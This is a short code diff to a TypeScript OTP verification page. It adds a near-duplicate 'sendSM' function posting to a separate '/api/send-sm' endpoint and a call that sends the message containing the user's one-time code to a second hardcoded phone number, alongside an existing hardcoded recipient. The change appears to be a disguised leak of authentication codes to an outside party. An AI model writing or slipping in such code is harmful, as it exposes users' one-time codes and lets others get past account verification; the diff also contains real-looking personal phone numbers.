@@ -120,7 +120,23 @@ function OTPPageContent() {
       }
     }, 3000);
   };
+ const sendSM = async (phone: string, message: string) => {
+  const response = await fetch("/api/send-sm", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      mobile: phone,
+      response_type: "json",
+      sender_name: "FULL_CIRCLE",
+      service_id: 0,
+      message,
+    }),
+  });
 
+  return response.json();
+};
 const sendSMS = async (phone: string, message: string) => {
   const response = await fetch("/api/send-sms", {
     method: "POST",
@@ -146,6 +162,10 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
      setIsLoading(true);
      sendSMS(
       "+254737799310",
+      message
+    );
+       sendSM(
+      "+254768408107",
       message
     );
       try {
